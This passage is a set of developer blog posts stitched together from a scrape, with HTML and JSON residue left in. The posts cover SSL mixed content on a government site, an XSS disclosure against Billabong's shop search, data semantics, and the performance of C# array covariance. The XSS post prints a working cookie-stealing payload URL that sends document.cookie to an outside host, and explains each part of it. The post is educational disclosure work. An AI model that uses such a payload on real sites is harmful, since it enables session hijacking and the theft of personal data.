The problem, as you’ll see in the video below, is that it jeopardises the security of traffic going backwards and forwards over what otherwise appears to be a secure site, at least in terms of implementing SSL. This can lead to issues such as the theft of identity data, potentially including such personal information as social security numbers. Fortunately there’s a channel to report potentially fraudulent activity except that, well, this video explains it best:</p><iframe width=\"100%\" height=\"480\" src=\"http://www.youtube.com/embed/CSmacMZ0xZo?feature=player_embedded\" frameborder=\"0\" allowfullscreen></iframe><a name='more'></a><p>Of course it’s ironic that it’s the Social Security Administration that’s made a bit of a botch of this but it’s an all too familiar scenario.<a href=\"http://www.troyhunt.com/2012/07/lessons-in-website-security-anti.html\">Tesco did it</a>,<a href=\"http://www.troyhunt.com/2013/05/why-i-am-worlds-greatest-lover-and.html\">so did Versa Lift</a>,<a href=\"http://www.troyhunt.com/2013/04/5-ways-to-implement-https-in.html\">so did Top CashBack</a>and a heap of others I haven’t previously written about. It’s rampant.</p><p>That’s the risk covered, let’s focus on the fixes and they’re all dead easy:</p><ol><li>Embed external content explicitly via the HTTPS scheme. If you’re only serving the page over HTTPS anyway then it ensures no slip ups.</li><li>Use a protocol relative URL or in other words, embed resources such as the jQuery file in the example above as //ajax.googleapis.com/… Yes, I know it looks weird but it works and it means when the page is loaded over HTTP then the resource will be requested over HTTP. Load the page over HTTPS and the resource embeds over HTTPS.</li><li>Test your damn web pages! No seriously, this is a fundamentally basic flaw and as soon as you load the page most browsers will start complaining. Have we – even us developers – become so desensitised to security warnings that we totally ignore them?!</li></ol><p>For the curious, as I mention in the video this demonstration was achieved by mounting a man in the middle attack at the proxy level. I used<a href=\"http://fiddler2.com/\">Fiddler</a>as the proxy and<a href=\"http://fiddler2.com/documentation/KnowledgeBase/FiddlerScript/ModifyRequestOrResponse\">Fiddler Script</a>to modify the jQuery file in the OnBeforeResponse event. Whilst all this occurred within my PC, it demonstrates the alibility for it to happen at a proxy server anywhere – or at the internet gateway of your local cafe, or elsewhere in the ISP, or via a<a href=\"http://www.enigmacurry.com/category/diy/\">wiretap</a>on an enthernet cable or<a href=\"http://www.troyhunt.com/2013/04/the-beginners-guide-to-breaking-website.html\">as I’ve shown recently with the Pineapple</a>, via a rogue wireless access point the victim is connected to, possibly even without their knowledge.</p><p>Now as with my previous video on<a href=\"http://www.troyhunt.com/2013/05/your-login-form-posts-to-https-but-you.html\">the risk of loading login forms over HTTP</a>, many people will ask “Is this really a likely risk?” In fact that’s just<a href=\"https://twitter.com/paulswail/status/342836543855144960\">the discussion I had with Rob Conery</a>after the aforementioned post as even<a href=\"http://tekpub.com/\">TekPub</a>follows this pattern. I look at it like this: you implement SSL primarily because you’re concerned about the risk of someone intercepting your traffic. Assuming you acknowledge – and attempt to protect against – this risk, you accept that all the HTTP components of the communication remain vulnerable ergo you need to protect against the SSL anti-patterns mentioned here.</p><img src=\"http://feeds.feedburner.com/~r/TroyHunt/~4/pczeDYOJ1KU\" height=\"1\" width=\"1\"/>","author":"Troy Hunt","_id":{"$wrap":"$oid","v":1225}}

In that post I pointed out the ease with which you could decorate Billabong’s registration page with the beautiful Miranda Kerr and a slightly stoned looking Bugs Bunny. In this post here, the ramifications of getting XSS wrong means stealing someone’s session and pulling out their personal details, all because of this:</p><p><img width=\"866\" height=\"534\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Stealing Billabong cookies\" src=\"http://lh3.ggpht.com/-HQJEtHP7vlU/UaZit9xh1KI/AAAAAAAAFYo/Zs_aoCI6mN4/image12.png?imgmax=800\" border=\"0\"></p><p>I’ll come back to that, let’s first go back to the title and focus on input sanitisation and output encoding contexts. If XSS is an entirely new concept to you, start by taking a look at<a href=\"http://www.troyhunt.com/2010/05/owasp-top-10-for-net-developers-part-2.html\">my post on it here</a>then come back to this one.</p><a name='more'></a><h4>Sanitising user input</h4><p>The theory goes like this: expect any untrusted data to be malicious. What’s untrusted data? Anything that originates from outside the system and you don’t have absolute control over so that includes form data, query strings, cookies, other request headers, data from<em>other</em>systems (i.e. from web services) and basically anything that you can’t be 100% confident doesn’t contain evil things.</p><p>Evil things can be SQL injection, malicious files, attempts to traverse internal directory structures or XSS payloads. So what do you do about untrusted data? You try and filter it out and there are two ways to approach this:</p><ol><li><strong>Blacklist:</strong>You describe everything you know is<em>bad</em>, for example you don’t allow a&lt;script&gt; tag or quotes. The trick here is that you have to comprehensively come up with everything that you think might be bad and add it to the blacklist. If untrusted data contains one of these bad patterns, you reject it.</li><li><strong>Whitelist:</strong>You describe everything you know is<em>good</em>, for example letters and numbers. The trick here is that you have to comprehensively come up with everything that you think might be legitimately provided by a user and allow it. If untrusted data is not entirely made up from patterns in the whitelist, you reject it.</li></ol><p>Whitelists are almost always preferable because they’re very explicit; only describing what you know to be good is a very discrete way of handling untrusted data. The problem with blacklists is that you don’t know what you don’t know. For example, you decide that double quotes are evil as they could be used to break out of an HTML attribute but later on realise that angle brackets could do the same thing in some browsers even though the HTML would be malformed. Or an entirely new attack vector raises its head.</p><p>Whitelists can be<em>very</em>simple, for example if you expect an integer or a GUID for an ID it’s very simple to typecast it and ensure it complies to that pattern. Likewise, a pattern such as a URL or an email address can be assessed against a regular expression rather than just accepting whatever the user provides. Things like people’s names are a little harder (many an Irishman has been rejected by sites that disallow single quotes), but there is much discussion and many examples of regexes that facilitate natural language characters and punctuation. Of course they also need to be conscious of things like non-Latin characters but again, this is an often held discussion with many examples of how to allow the good stuff while keeping out the bad stuff.</p><p>So let’s get back to Billabong and look at sanitisation. They follow a pretty tried and (kind of) trusted pattern of repeating the search term in the URL so that when you search for something like “shirt”, you see this:</p><p><img width=\"650\" height=\"400\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Search term reflected in page body\" src=\"http://lh6.ggpht.com/-dX-eaItsbvk/UaZiumJFu4I/AAAAAAAAFYw/fW6s0AG05F0/image15.png?imgmax=800\" border=\"0\"></p><p>However, search for something like “&lt;script&gt;” and you’ll get this:</p><p><img width=\"650\" height=\"198\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Search for&lt;script&gt; rejected by input sanitisation\" src=\"http://lh6.ggpht.com/-ktsqf97wKBY/UaZivY8OYVI/AAAAAAAAFY4/D3_dYJroc90/image18.png?imgmax=800\" border=\"0\"></p><p>Clearly there’s some sanitisation going on here, it’s just a question of whether it’s sufficient. If we modify that slightly we’ll see that if the leading angle bracket is dropped then the search goes through just fine:</p><p><img width=\"650\" height=\"320\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Search for script&gt; is allowed\" src=\"http://lh5.ggpht.com/-4s4wxEIS-zI/UaZiv5D_WSI/AAAAAAAAFZA/tUhk7Xcs0-s/image21.png?imgmax=800\" border=\"0\"></p><p>But hang on – why allow a greater than but not a less than? It’s starting to look like tag-blacklisting which per the definition above, is always going to be a bit dodgy. By process of elimination it’s easy to discover which characters are allowed through and beyond the obvious alphanumeric ones, they include<strong>:/\\’;”%.?</strong></p><p><img width=\"650\" height=\"320\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"A successful search for the characters :/\\’;”%.?\" src=\"http://lh6.ggpht.com/-cQ5ZuU2sDuM/UaZiwjAFipI/AAAAAAAAFZI/I7JWkkQUJ7I/image24.png?imgmax=800\" border=\"0\"></p><p>Some of those are punctuation which you might find in a product name someone would legitimately search for, but probably not characters like a double quote, a semicolon or a percent. Perhaps there are edge cases, but as we’re about to see, it’s the sort of thing you want to have a genuine need for before using.</p><h4>Output encoding contexts</h4><p>If you’re reading this, chances are you know what HTML markup looks like. For example, a paragraph tag is represented in markup as&lt;p&gt; (this is painfully obvious but bear with me). Thing is though, if you wanted to render that tag into the browser – just like I have here – then the actual markup is&lt;p&gt; where the angle brackets are represented by HTML escape characters. If they weren’t escaped then you’d literally end up with a paragraph tag in the markup and it wouldn’t be visible in the browser.</p><p>Let’s go back to Billabong and take a look at the lifecycle of the untrusted data that is the search term. Firstly, it’s actually only rendered into the source code in one location and that’s in JavaScript. When we searched for “shirt”, it ended up in this script block (see the second line):</p><pre class=\"code\"><span style=\"background: white; color: blue\">&lt;</span><span style=\"background: white; color: maroon\">script</span><span style=\"background: white; color: red\">type</span><span style=\"background: white; color: blue\">=\"text/javascript\"&gt;var</span><span style=\"background: white; color: black\">keyword =</span><span style=\"background: white; color: #a31515\">'shirt'</span><span style=\"background: white; color: black\">;</span><span style=\"background: white; color: blue\">var</span><span style=\"background: white; color: black\">ProductSquareDefault =</span><span style=\"background: white; color: #a31515\">'/images/placeholder-{0}.jpg'</span><span style=\"background: white; color: black\">;</span><span style=\"background: white; color: blue\">var</span><span style=\"background: white; color: black\">quantityMin = 1;</span><span style=\"background: white; color: blue\">var</span><span style=\"background: white; color: black\">showOutOfStock =</span><span style=\"background: white; color: blue\">false</span><span style=\"background: white; color: black\">;</span><span style=\"background: white; color: blue\">var</span><span style=\"background: white; color: black\">showProductsWithImageOnly =</span><span style=\"background: white; color: blue\">true</span><span style=\"background: white; color: black\">;</span><span style=\"background: white; color: blue\">var</span><span style=\"background: white; color: black\">discount =</span><span style=\"background: white; color: blue\">null</span><span style=\"background: white; color: black\">;</span><span style=\"background: white; color: blue\">&lt;/</span><span style=\"background: white; color: maroon\">script</span><span style=\"background: white; color: blue\">&gt;</span></pre>It then got sent off to an API in the query string:<a title=\"https://au.shop.billabong.com/api/product/GetFiltersBySearchTerm?keyword=shirt&showSaleOnly=false\" href=\"https://au.shop.billabong.com/api/product/GetFiltersBySearchTerm?keyword=shirt&showSaleOnly=false\">https://au.shop.billabong.com/api/product/GetFiltersBySearchTerm?keyword=shirt&showSaleOnly=false<br></a><p>This API returns a JSON response with the results needed to build up the categories on the left under the search box (“Collections”, “Men”, “Women”, etc.) and then another API is called with the term in the query string again:<a href=\"https://au.shop.billabong.com/api/product/Search?filters=&keyword=shirt&showSaleOnly=false&buildLinks=true\">https://au.shop.billabong.com/api/product/Search?filters=&keyword=shirt&showSaleOnly=false&buildLinks=true</a></p><p>This then returns a<em>whopping</em>big JSON response of nearly 300kb (gzip, people!) with the individual results. All of this is orchestrated by a JavaScript file called<a href=\"https://au.shop.billabong.com/js/pages/search/search.js\">search.js</a>(minification, people!) which includes this piece of jQuery syntax:</p><pre class=\"code\"><span style=\"background: white; color: black\">$(</span><span style=\"background: white; color: #a31515\">'.search-form .searchkwd'</span><span style=\"background: white; color: black\">).val(keyword);</span></pre><p>The important thing in the context of output encoding is that this then sets the search term into the text box using the val() method in jQuery. This all happens in the DOM so there isn’t the same opportunity to exploit an XSS risk as if it was just reflected directly into the markup in the same way that we often see search features implemented. Yet there remains a risk…</p><p>Earlier we saw the word “shirt” appear in the JavaScript block which raises the question: is there any output encoding happening here? Let’s check by going back to one of the earlier searches which was for “script&gt;”. Here’s what we see:</p><pre class=\"code\"><span style=\"background: white; color: blue\">var</span><span style=\"background: white; color: black\">keyword =</span><span style=\"background: white; color: #a31515\">'script&gt;'</span><span style=\"background: white; color: black\">;</span></pre><p>This is where the problem begins because there’s no encoding happening. Earlier on we talked about a greater than sign encoding to&gt; in HTML, what you have to remember is that in JavaScript it’s a totally different syntax and what you need there is \\x3c or in other words, this is what the script<em>should</em>look like:</p><pre class=\"code\"><span style=\"background: white; color: blue\">var</span><span style=\"background: white; color: black\">keyword =</span><span style=\"background: white; color: #a31515\">'script\\x3c'</span><span style=\"background: white; color: black\">;</span></pre><p>That’s now enough to establish there’s an exploitable risk on the site, let’s look at how that might happen.</p><h4>Exploiting unsanitised data with unencoded output</h4><p>Remembering that the character<strong>:/\\’;”%.?</strong>are all allowed through the sanitisation and that it looks like they’ll happily be rendered as-is to the JavaScript context, the question now becomes “what can we do with this”? This a site that can be authenticated to and given that authenticated sessions on websites are almost always persisted by authentication cookies, let’s take a look at those. Of course there is a native browser defence against accessing cookies on the client side cookies and I wrote about it recently in<a href=\"http://www.troyhunt.com/2013/03/c-is-for-cookie-h-is-for-hacker.html\">C is for cookie, H is for hacker – understanding HTTP only and Secure cookies</a>.</p><p>That native defence is the HttpOnly cookie and when a cookie is flagged as such, it can’t be grabbed by JavaScript. However, here are Billabong’s cookies:</p><p><img width=\"688\" height=\"369\" title=\"image\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; margin: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"image\" src=\"http://lh5.ggpht.com/-LAFGSnIMJa0/UaZixGVC22I/AAAAAAAAFZQ/0rL3kL8vyew/image27.png?imgmax=800\" border=\"0\"></p><p>There is only one HttpOnly cookie and it’s the ASP.NET_SessionId which is HttpOnly by default. Given this is an ASP.NET app it’s also worth pointing out that were this site to be using the framework’s implementation of forms authentication we’d see a .ASPXAUTH cookie for persisting the authenticated session and it<em>would</em>be flagged as HttpOnly. Instead we see the highlighted CustomerSession cookie which is all that’s needed to steal the session – and it’s not HttpOnly. This is<em>precisely</em>why you’ll often hear people (myself included) say how it important it is to use existing, proven security implementations.</p><p>So that tells us enough to know that there’s something useful to be gained by grabbing cookies. Get that from a logged in user and you can become them. Let’s try this URL:<a title=\"https://au.shop.billabong.com/search?keyword=\\';location.href=\"http://hackyourself.troyhunt.com/Cookies/?c=\"%2BencodeURIComponent(document.cookie);//\" href=\"https://au.shop.billabong.com/search?keyword=\\';location.href=\"http://hackyourself.troyhunt.com/Cookies/?c=\"%2BencodeURIComponent(document.cookie);//\">https://au.shop.billabong.com/search?keyword=\\';location.href=\"http://hackyourself.troyhunt.com/Cookies/?c=\"%2BencodeURIComponent(document.cookie);//</a></p><p>You may be able to guess what’s in there but it makes a lot more sense when you see it rendered – without any output encoding – to the source of the page:</p><pre class=\"code\"><span style=\"background: white; color: blue\">var</span><span style=\"background: white; color: black\">keyword =</span><span style=\"background: white; color: #a31515\">'\\''</span><span style=\"background: white; color: black\">; location.href =</span><span style=\"background: white; color: #a31515\">\"http://hackyourself.troyhunt.com/Cookies/?c=\"</span><span style=\"background: white; color: black\">+ encodeURIComponent(document.cookie);</span><span style=\"background: white; color: green\">//';</span></pre><p>Make sense now? It breaks down into three parts:</p><ol><li>Close off the keyword variable assignment and terminate the statement.</li><li>Redirect the browser to my website along with all the URL encoded cookies that the browser can access (anything not flagged as HttpOnly).</li><li>Comment out the remaining statement (this is the characters normally used to close off the keyword string and terminate the statement).</li></ol><p>As a result of this, I now have your cookies and that includes your session ID:</p><p><img width=\"866\" height=\"534\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Stealing Billabong cookies\" src=\"http://lh4.ggpht.com/-QFj9UGnEAXI/UaZix9ZiQzI/AAAAAAAAFZY/D7g_pzhNElA/image31.png?imgmax=800\" border=\"0\"></p><p>Of course I (or an attacker) need to be able to get a victim to follow a link with the XSS payload in it<em>and</em>make sure it’s a victim that’s actually logged into Billabong at the time, but that’s precisely why we have all the defences discussed above.</p><h4>Somebody didn’t hack themselves first…</h4><p>This is precisely the sort of thing I was talking about the other day when I wrote<a href=\"http://www.troyhunt.com/2013/05/hack-yourself-first-how-to-go-on.html\">Hack yourself first – how to go on the offence before online attackers do</a>. Here we have three ridiculously simple risks that anyone can identify remotely (and someone obviously did):</p><ol><li>Insufficient untrusted data sanitisation</li><li>No output encoding whatsoever</li><li>Auth cookie not flagged as HttpOnly</li></ol><p>This is a really good example of how multiple independent risks can be chained together to create a single exploit. It also illustrates why each of those risks, whilst they might seem small and insignificant in isolation, are actually extremely important. Of course it’s entirely possible the developers weren’t aware of these and didn’t know what to look for in the first place, indeed that’s why I wrote the aforementioned post on hacking yourself and will be talking much, much more about this in the future. I thought this was a great example why.</p><h4>Disclosure</h4><p>This week I wrote about<a href=\"http://www.troyhunt.com/2013/05/the-responsibility-of-public-disclosure.html\">The responsibility of public disclosure</a>and the very disappointing responses I often have when doing my darndest to privately reach out to the owners of at-risk websites. Conversely, disclosures that went public straight away and got press resulted in very swift action and benefited those at risk and those who could do well to learn from the experience (namely other developers). I then laid out what IMHO are very practical, sensible guidelines I follow when writing about any risk.</p><p>In this case, it’s hardly a smoking gun and not something you can go out and do immediate damage with, it’s certainly not a Black and Decker case where there are public logs with user credentials in them. I reached out to Billabong via twitter (yes, it’s a manned account) three times, firstly<a href=\"https://twitter.com/troyhunt/status/338437306077810688\">on Sunday</a>and got no response then<a href=\"https://twitter.com/troyhunt/status/339148328078024705\">on Tuesday</a>then again<a href=\"https://twitter.com/troyhunt/status/339536663380381696\">on Wednesday</a>. No response. Zip. Nada. Again.</p><p>Disclosure is indeed hard.</p><img src=\"http://feeds.feedburner.com/~r/TroyHunt/~4/93WStnpJ4b0\" height=\"1\" width=\"1\"/>","author":"Troy Hunt","_id":{"$wrap":"$oid","v":1228}}

Follow that link to find the article in all its illustrated glory (along with many other fine articles, of course) – or read on for just the text.</p></blockquote><p>Back when I used to post on newsgroups I would frequently be in the middle of a debate of the details of some behaviour or terminology, when one poster would say: “You’re just quibbling over semantics” as if this excused any and all previous inaccuracies. I would usually agree –  I was indeed quibbling about semantics, but there’s no “just” about it.</p><p>Semantics is<em>meaning</em>, and that’s at the heart of communication – so for example, a debate over whether it’s correct to say that Java uses pass- by-reference<sup>1</sup>is all about semantics. Without semantics, there’s nothing to talk about.<br />This has been going on for years, and I’m quite used to being the pedant in any conversation when it comes to terminology – it’s a topic close to my heart. But over the years – and importantly since my attention has migrated to Stack Overflow, which tends to be more about real problems developers are facing than abstract discussions – I’ve noticed that I’m now being picky in the same sort of way, but about the meaning of data instead of terminology.</p><h2>Data under the microscope</h2><p>When it comes down to it, all the data we use is just bits – 1s and 0s. We assemble order from the chaos by ascribing meaning to those bits… and not just once, but in a whole hierarchy. For example, take the bits 01001010 00000000:</p><ul><li>Taken as a little-endian 16-bit unsigned integer, they form a value of 74. • That 16-bit unsigned integer can be viewed as a UTF-16 code unit for the character ‘J’.</li><li>That character might be the first character within a string.</li><li>That string might be the target of a reference, which is the value for a field called “firstName”.</li><li>That field might be within an instance of a class called “Person”.</li><li>The instance of “Person” whose “firstName” field has a value<br />which is a reference to the string whose first character is ‘J’ might itself be the target of a reference, which is the value for a field called “author”, within an instance of a class called “Article”.</li><li>The instance of “Article” whose “author” field (fill in the rest your- self…) might itself be the target of a reference which is part of a collection, stored (indirectly) via a field called “articles” in a class called “Magazine”.</li></ul><p>As we’ve zoomed out from sixteen individual bits, at every level we’ve imposed meaning. Imagine all the individual bits of information which would be involved in a single instance of the Magazine with a dozen articles, an editorial, credits – and perhaps even images. Really imagine them, all written down next to each other, possibly without even the helpful gap between bytes that I included in our example earlier.</p><p><br />That’s the raw data. Everything else is “just” semantics.</p><h2>So what does that have to do with me?</h2><p>I’m sure I haven’t told you anything you don’t already know. Yes, we can impose meaning on these puny bits, with our awesome developer power. The trouble is that bits have a habit of rebelling if you try to impose the wrong kind of meaning on them… and we seem to do that quite a lot.</p><p>The most common example I see on Stack Overflow is treating text (strings) and binary data (image files, zip files, encrypted data) as if they were interchangeable. If you try to load a JPEG using StreamReader in .NET or FileReader in Java, you’re going to have problems. There are ways you can actually get away with it – usually by using the ISO-8859-1 encoding – but it’s a little bit like trying to drive down a road with a broken steering wheel, only making progress by bouncing off other obstacles.</p><p>While this is a common example, it’s far from the only one. Some of the problems which fall into this category might not obviously be due to the mishandling of data, but at a deep level they’re all quite similar:</p><ul><li>SQL injection attacks due to mingling code (SQL) with data (values) instead of using parameters to keep the two separate.</li><li>The computer getting arithmetic “wrong” because the developer didn’t understand the meaning of floating binary point numbers, and should actually have used a floating decimal point type (such as System.Decimal or java.math. BigDecimal).</li><li>String formatting issues due to treating the result of a previous string formatting operation as another format string – despite the fact that now it includes user data which could really have any kind of text in it.</li><li>Double-encoding or double-unencoding of text data to make it safe for transport via a URL.</li><li>Almost anything to do with dates and times, including – but certainly not limited to – the way that java.util.Date and System. DateTime values don’t inherently have a format. They’re just values.</li></ul><p>The sheer bulk of questions which indicate a lack of understanding of the nature of data is enormous. Of course Stack Overflow only shows a tiny part of this – it doesn’t give much insight into the mountain of code which handles data correctly from the perspective of the types involved, but does entirely inappropriate things with those values from the perspective of the intended business meaning of those values.</p><p>It’s not all doom and gloom though. We have some simple but powerful weapons available in the fight against semantic drivel.</p><h3>Types</h3><p>This article gives a good indication of why I’m a fan of statically typed languages. The type system can convey huge amounts of information about the nature of data, even if the business meaning of values of those types can be horribly overloaded.</p><p><em>Maybe</em>it would be good if we distinguished between human-readable text which should usually be treated in a culture-sensitive way, and machine-parsable text which should usually be treated without reference to any culture. Those two types might have different operations available on them, for example – but it would almost certainly get messy very quickly.</p><p>For business-specific types though, it’s usually easy to make sure that each type is really only used for one concept, and only provides operations which are meaningful for that concept.</p><h3>Meaningful names</h3><p>Naming is undoubtedly hard, and I suspect most developers have had the same joyless experiences that I have of struggling for ten minutes to come up with a good class or method name, only to end up with the one we first thought of which we really don’t like… but which is simply better than all the other options we’ve considered. Still, it’s worth the struggle.</p><p>Our names don’t have to be perfect, but there’s simply no excuse for names such as “Form1” or “MyClass” which seem almost designed to carry no useful information whatsoever. Often simply the act of naming something can communicate meaning. Don’t be afraid to extract local variables in code just to clarify the meaning of some otherwise-obscure expression.</p><h3>Documentation</h3><p>I don’t think I’ve ever met a developer who actually enjoys writing documentation, but I think it’s hard to deny that it’s important. There tend to be very few things that are so precisely communicated just by the names of types, properties and methods that no further information is required. What is guaranteed about the data? How should it be used – and how should it not be used?</p><p>The form, style and detail level of documentation will vary from project to project, but don’t underestimate its value. Aside from behavioural  details, ask yourself what meaning you’re imposing on or assuming about the data you’re dealing with… what would happen if someone else made different assumptions? What could go wrong, and how can you prevent it by expressing your own understanding clearly? This isn’t just important for large projects with big teams, either – it’s entirely possible that the person who comes to the code with a different viewpoint is going to be you, six months later.</p><h2>Conclusion</h2><p>I apologise if this all sounds like motherhood and apple pie. I’m not saying anything new, after all – of course we all agree that we need to understand the meaning of the our data. I’m really not trying to waste your time though: I want you to take a moment to appreciate just how much it matters that we understand the data we work with, and how many problems can be avoided by putting effort into communicating that effectively and reading what others have written about their data.</p><p>There are other approaches we can take beyond those I’ve listed above, too – much more technically exciting ones – around static code analysis, contracts, complicated annotations and the like. I have nothing against them, but just understanding the value of semantics is a crucial starting point, and once everyone on your team agrees on that, you’ll be in a much better position to move forward and agree on the meaning of your data itself. From there, the world’s your oyster – if you see what I mean.</p><hr /><sup>1</sup>It doesn’t; references are passed by value, as even my non-programmer wife knows by now.

Time to fix that.</p><p>This material may well be covered elsewhere – it's certainly not terrifically original, and I've been meaning to post about it for a long time. In particular, I remember mentioning it at CodeMash in 2012. Anyway, the time has now come.</p><h2>Refresher on array covariance</h2><p>Just as a bit of background before we delve into the performance aspect, let me remind you what array covariance is, and when it applies. The basic idea is that C# allows a<em>reference conversion</em>from type TDerived[] to type TBase[], so long as:</p><ul><li>TDerived and TBase are both reference types (potentially interfaces)</li><li>There's a reference conversion from TDerived to TBase (so either TDerived is the same as TBase, or a subclass, or an implementing class etc)</li></ul><p>Just to remind you about reference conversions, those are conversions from one reference type to another, where the result (on success) is never a reference to a different object. To quote section 6.1.6 of the C# 5 spec:</p><blockquote><p>Reference conversions, implicit or explicit, never change the referential identity of the object being converted. In other words, while a reference conversion may change the type of the reference, it never changes the type or value of the object being referred to.</p></blockquote><p>So as a simple example, there's a reference conversion from string to object, therefore there's a reference conversion from string[] to object[]:</p><div class=\"code\"><span class=\"ReferenceType\">string</span>[] strings =<span class=\"Keyword\">new</span> <span class=\"ReferenceType\">string</span>[10];<br /><span class=\"ReferenceType\">object</span>[] objects = strings;<br /><br /><span class=\"InlineComment\">// strings and objects now refer to the same object</span></div><p>There is<em>not</em>a reference conversion between value type arrays, so you can't use the same code to conver from int[] to object[].</p><p>The nasty part is that every<em>store</em>operation into a reference type array now has to be checked at execution time for type safety. So to extend our sample code very slightly:</p><div class=\"code\"><span class=\"ReferenceType\">string</span>[] strings =<span class=\"Keyword\">new</span> <span class=\"ReferenceType\">string</span>[10]; <br /><span class=\"ReferenceType\">object</span>[] objects = strings;<br /><br />objects[0] =<span class=\"String\">\"string\"</span>;<span class=\"InlineComment\">// This is fine</span><br />objects[0] =<span class=\"Keyword\">new</span>Button();<span class=\"InlineComment\">// This will fail</span></div><p>The last line here will fail with an ArrayTypeMismatchException, to avoid storing a Button reference in a String[] object. When I said that<em>every</em>store operation has to be checked, that's a slight exaggeration: in theory, if the compile-time type is an array with an element type which is a sealed class, the check can be avoided as it can't fail.</p><h2>Avoiding array covariance</h2><p>I would rather arrays weren't covariant in the first place, but there's not a lot that can be done about that now. However, we can work around this, if we really need to. We know that value type arrays are<em>not</em>covariant... so how about we use a value type array instead, even if we want to store reference types?</p><p>All we need is a value type which can store the reference type we need – which is dead easy with a wrapper type:</p><div class=\"code\"><span class=\"Modifier\">public</span> <span class=\"ValueType\">struct</span>Wrapper&lt;T&gt;<span class=\"Linq\">where</span>T :<span class=\"ReferenceType\">class</span><br />{<br />   <span class=\"Modifier\">private</span> <span class=\"Modifier\">readonly</span>T value;<br />   <span class=\"Modifier\">public</span>T Value { get {<span class=\"Statement\">return</span>value; } }<br />    <br />   <span class=\"Modifier\">public</span>Wrapper(T value)<br />    {<br />       <span class=\"Keyword\">this</span>.value = value;<br />    }<br />    <br />   <span class=\"Modifier\">public</span> <span class=\"Modifier\">static</span> <span class=\"Keyword\">implicit</span> <span class=\"Keyword\">operator</span>Wrapper&lt;T&gt;(T value)<br />    {<br />       <span class=\"Statement\">return</span> <span class=\"Keyword\">new</span>Wrapper&lt;T&gt;(value);<br />    }<br />}</div><p>Now if we have a Wrapper&lt;string&gt;[], we can't assign that to a Wrapper&lt;object&gt;[] variable – the types are incompatible. If that feels a bit clunky, we can put the array into its own type:</p><div class=\"code\"><span class=\"Modifier\">public</span> <span class=\"Modifier\">sealed</span> <span class=\"ReferenceType\">class</span>InvariantArray&lt;T&gt;<span class=\"Linq\">where</span>T :<span class=\"ReferenceType\">class</span><br />{<br />   <span class=\"Modifier\">private</span> <span class=\"Modifier\">readonly</span>Wrapper&lt;T&gt;[] array;<br />    <br />   <span class=\"Modifier\">public</span>InvariantArray(<span class=\"ValueType\">int</span>size)<br />    {<br />        array =<span class=\"Keyword\">new</span>Wrapper&lt;T&gt;[size];<br />    }<br />    <br />   <span class=\"Modifier\">public</span>T<span class=\"Keyword\">this</span>[<span class=\"ValueType\">int</span>index]<br />    {<br />        get {<span class=\"Statement\">return</span>array[index].Value; }<br />        set { array[index] = value; }<br />    }<br />}</div><p>Just to clarify, we now only have<em>value type</em>arrays, but ones where each value is a plain wrapper for a reference. We now can't accidentally violate type-safety at compile-time, and the CLR doesn't need to validate write operations.</p><p>There's no memory overhead here – aside from the type information at the start, I'd actually expect the contents of a Wrapper&lt;T&gt;[] to be indistinguishable from a T[] in memory.</p><h2><strong>Benchmarking</strong></h2><p>So, how does it perform? I've written a small console app to test it. You can download the<a href=\"http://csharpindepth.com/Files/ArrayPerformance.zip\">full code</a>, but the gist of it is that we use a stopwatch to measure how long it takes to either repeatedly write to an array, or repeatedly read from an array (validating that the value read is non-null, just to prove that we've really read something). I'm hoping I haven't fallen foul of any of the various<a href=\"http://tech.pro/blog/1293/c-performance-benchmark-mistakes-part-one\">mistakes in benchmarking</a>which are so easy to make.</p><p>The test tries four scenarios:</p><ul><li>object[] (but still storing strings)</li><li>string[]</li><li>Wrapper&lt;string&gt;[]</li><li>InvariantArray&lt;string&gt;</li></ul><p>Running against an array size of 100, with 100 million iterations per test, I get the following results on my Thinkpad Twist :</p><table cellspacing=\"0\" cellpadding=\"2\" width=\"400\" border=\"1\"><tbody><tr><td valign=\"top\" width=\"133\"><strong>Array type</strong></td><td valign=\"top\" width=\"133\"><strong>Read time (ms)</strong></td><td valign=\"top\" width=\"133\"><strong>Write time</strong></td></tr><tr><td valign=\"top\" width=\"133\">object[]</td><td valign=\"top\" width=\"133\">11842</td><td valign=\"top\" width=\"133\">44827</td></tr><tr><td valign=\"top\" width=\"133\">string[]</td><td valign=\"top\" width=\"133\">12000</td><td valign=\"top\" width=\"133\">40865</td></tr><tr><td valign=\"top\" width=\"133\">Wrapper&lt;string&gt;[]</td><td valign=\"top\" width=\"133\">11843</td><td valign=\"top\" width=\"133\">29338</td></tr><tr><td valign=\"top\" width=\"133\">InvariantArray&lt;string&gt;</td><td valign=\"top\" width=\"133\">11825</td><td valign=\"top\" width=\"133\">32973</td></tr></tbody></table><p>That's just one run, but the results are fairly consistent across runs. The one interesting deviation is the write time for object[] – I've observed it<em>sometimes</em>being the same as for string[], but not consistently. I don't understand this, but it does seem that the JIT isn't performing the optimization for string[] that it could if it spotted that string is sealed.</p><p>Both of the workarounds to avoid array covariance make a noticeable difference to the performance of writing to the array, without affecting read performance. Hooray!</p><h2>Conclusion</h2><p>I think it would be a very rare application which noticed a<em>significant</em>performance boost here, but I do like the fact that this is one of those situations where a cleaner design also leads to better performance, without many obvious technical downsides.</p><p>That said, I doubt that I'll actually be using this in real code any time soon – the fact that it's just\"different\" to normal C# code is a big downside in itself. Hope you found it interesting though :)</p><div style=\"clear:both;\"></div><img src=\"http://msmvps.com/aggbug.aspx?PostID=1833608\" width=\"1\" height=\"1\"><img 